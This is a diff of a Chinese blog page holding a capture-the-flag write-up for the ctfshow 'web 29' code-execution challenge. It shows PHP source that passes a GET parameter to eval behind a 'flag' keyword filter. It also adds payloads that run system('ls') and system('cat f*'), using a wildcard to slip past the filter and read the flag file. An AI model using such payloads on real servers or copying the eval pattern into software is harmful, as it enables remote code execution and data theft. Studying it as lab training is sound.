@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      79 字
+      161 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1
+      2
        分钟
     </span>
   
@@ -235,9 +235,20 @@
             
             <div class="markdown-body">
               <h3 id="web-29"><a href="#web-29" class="headerlink" title="web 29"></a>web 29</h3><p>源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">error_reporting(<span class="hljs-number">0</span>);  <span class="hljs-comment">// 关闭错误报告</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;  <br>    <span class="hljs-comment">// 正则匹配</span><br>    <span class="hljs-comment">//    /i表示大小写不敏感</span><br>    <span class="hljs-comment">//    preg_match()正则匹配函数，匹配成功返回1，否则返回0</span><br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">error_reporting(<span class="hljs-number">0</span>);  <span class="hljs-comment">// 关闭错误报告</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;  <span class="hljs-comment">// 检测变量是否已设置并且非null</span><br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;  <br>    <span class="hljs-comment">// 正则匹配</span><br>    <span class="hljs-comment">//    /i表示大小写不敏感</span><br>    <span class="hljs-comment">//    preg_match()正则匹配函数，匹配成功返回1，否则返回0</span><br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>
 
-<p>分析源码后可知，</p>
+<p>分析源码后可知，改代码接收一个GET请求的参数c，并且会过滤flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">/?c=system(&quot;ls&quot;);<br></code></pre></td></tr></table></figure>
+
+<p>使用ls查看当前目录下的内容，看到flag.php</p>
+<img src="/img/CTF-SHOW-WEB入门-代码执行/29-1.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">/?c=system(&quot;cat f*&quot;);<br></code></pre></td></tr></table></figure>
+
+<p>使用正则表达式进行读取，查看源码即可获得flag</p>
+<img src="/img/CTF-SHOW-WEB入门-代码执行/29-2.png" srcset="/img/loading.gif" lazyload>
 
             </div>
             <hr>
